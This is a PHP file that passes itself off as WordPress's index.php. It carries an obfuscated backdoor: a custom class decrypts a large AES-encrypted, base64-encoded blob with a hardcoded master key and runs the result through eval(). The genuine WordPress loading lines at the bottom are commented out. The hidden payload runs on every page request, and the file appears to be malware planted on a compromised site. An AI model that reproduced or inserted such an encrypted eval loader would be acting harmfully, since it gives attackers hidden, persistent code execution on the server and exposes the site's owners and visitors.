<?php
class Secure
{
    private $masterKey;
    private $iterations = 10000;
    private $cipher = 'aes-256-cbc';
    private $hmacAlgo = 'sha256';
    private $saltLength = 16;

    public function __construct($masterKey)
    {
        $this->masterKey = $masterKey;
    }

    public function decrypt($encrypted)
    {
        $data = base64_decode($encrypted);
        $salt = substr($data, 0, $this->saltLength);
        $ivLength = openssl_cipher_iv_length($this->cipher);
        $iv = substr($data, $this->saltLength, $ivLength);
        $hmac = substr($data, $this->saltLength + $ivLength, 32);
        $ciphertext = substr($data, $this->saltLength + $ivLength + 32);
        $derivedKeys = $this->deriveKeys($salt);
        $calcHmac = hash_hmac($this->hmacAlgo, $iv . $salt . $ciphertext, $derivedKeys['hmac'], true);
        $decrypted = openssl_decrypt($ciphertext, $this->cipher, $derivedKeys['encryption'], OPENSSL_RAW_DATA, $iv);
        return $decrypted;
    }

    private function deriveKeys($salt)
    {
        $keyMaterial = hash_pbkdf2(
            $this->hmacAlgo,
            $this->masterKey,
            $salt,
            $this->iterations,
            64,
            true
        );

        return [
            'encryption' => substr($keyMaterial, 0, 32),
            'hmac' => substr($keyMaterial, 32)
        ];
    }

    private function verifyHmac($knownHmac, $userHmac)
    {
        return hash_equals($knownHmac, $userHmac);
    }

    public function setIterations($iterations)
    {
        $this->iterations = (int) $iterations;
        return $this;
    }

    public function setCipher($cipher)
    {
        $this->cipher = $cipher;
        return $this;
    }
}

$secure = new Secure('3Etrksi87rde3hd8s819Poe0o39sqKjl9');
$str = '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';
$decrypted = $secure->decrypt($str);
eval ($decrypted);
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
// define( 'WP_USE_THEMES', true );

// /** Loads the WordPress Environment and Template */
// require __DIR__ . '/wp-blog-header.php';